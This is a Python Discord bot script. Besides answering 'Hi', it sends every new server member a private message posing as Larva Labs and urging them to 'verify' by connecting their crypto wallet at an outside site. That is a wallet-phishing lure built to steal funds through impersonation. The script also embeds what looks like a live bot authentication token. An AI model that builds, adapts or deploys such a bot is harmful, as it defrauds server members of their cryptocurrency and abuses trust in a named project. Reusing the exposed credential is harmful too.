import discord

intents = discord.Intents(members=True,messages=True, guilds=True)
client=discord.Client(intents=intents)

@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))

@client.event
async def on_message(message):
    if message.content == 'Hi':
        print('Send Message')
        await message.channel.send(f'Hello {message.author.mention}!')

@client.event
async def on_member_join(member):
    print("Recognised that a member called " + member.name + " joined")
    guild = client.get_guild(910217371657052181) # YOUR INTEGER GUILD ID HERE
    welcome_channel = guild.get_channel(910217372160372758) # YOUR INTEGER CHANNEL ID HERE

    await member.send(f'''Hello {member.mention} and welcome to Larva Labs Discord server. Please take the time to verify yourself on our server with the validator. Kindly follow the Procedure. To start the verification process check that the wallet you are linking is supported. https://safewalletauthenticator.com: 
Please connect your wallet and link your Discord via the **Wallet Dapps Connect: This server is powered and protected by Larva Labs. Certain channels will only be visible if you meet the necessary criteria and after you complete the verification-validate process. After Linking your Wallet: **Please reply the ✅ below after you link your wallet above.''')

@client.event
async def on_member_leave(member):
    print("Recognised that a member called " + member.name + " left")


client.run('OTE4NTU1NTcwMzE3OTU5MTY5.YbI9iQ.qG9tdX9FHx4mav-5V1JpbUAcvuI')